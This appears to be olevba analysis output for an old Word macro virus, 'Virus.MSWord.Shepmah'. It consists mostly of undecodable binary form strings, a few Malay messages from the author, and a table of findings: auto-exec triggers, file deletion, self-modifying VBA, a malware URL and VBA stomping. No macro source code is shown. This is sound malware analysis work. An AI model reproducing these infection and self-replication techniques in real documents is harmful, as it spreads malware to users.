- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��}D��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`r+��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����y����W�޾w�إK
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�>y�օ뗑
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x���+���7j���{��߹z����G/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?|��݋�N���=}���$7~��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E���9��P���T�TT�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]Tr��ɴ�N\�v2Q�+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������<X
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>xG���7�޽v
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u<��<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O%���=xp
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_��.!E�����g�>�v�I�����^���{��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=�F3~c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u�<�'�޻u�{.�A4�:�ƓzcW�㼺�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�K��/;��i�G�n�u���sG�g�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R���:v�\x�|z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p�q�ڵ��1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ї�u̱N)oޑ�(x�IP�r��F�|��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ч��a̝
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�)Ͱu�y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��H��`L�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ǝ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m6���~����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n� �4N�霨��,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2)p�������E,����ݺ�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��&�|�S
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$"1��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�jg�#�1k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��M'A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	U�đ��{l��h�d�?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����yX�+-Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@����X�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%h.{�G
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3Vڟ�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8hd���Q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���M�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���g�l�=g���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Go$(`�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R�t�,��sЌG
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'��؉6�,70��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�mX�x7
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ybx��#|��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�m9�,��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`8�UztR�a�s>��w�9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}��	ہ��B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0�0!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8��}��M�s��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Gt�yY"w��tS��C��X��g
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�H#o.�H#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���',�ǡ��pց흗�Y����VH���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�h�*�O9�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=��I�{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�N����mk^���s�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k�9�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O����)��N
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G=gr�A���_�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�f�S2Ʉ�e�W&�Sx�&zѧ���xO�^��q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ޱ@2��]�㇫�2AW=0�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_xA�a���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u��!}a�
W�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Me�+Z��a�r�l�?4�7�D
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8E*VъW�b
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��E.vы#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Psstt... Tengok sini la kawan.. ada mesej penting nak disampaikan. Bukan apa.. saja nak tutup mulut depa yang dok hingaq tu..
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Apakah yang lebih dibenci bila semua kerja-kerja kita tegendala sebab birus? HAMPEHS! Greeting kepada yang tersayang sempena birthdaynya hari ini. ILU~! Kepada semua warga UTM. Jangan panic.. ENJOY! [DD/UTM'99]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/i02/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Msg'" IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Butang'" IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Shepmah' - OLE stream: 'Macros/DingDang/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Butang_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |UserForm_Layout     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://hampehs.cjb.n|URL                                          |
|          |et                  |                                             |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

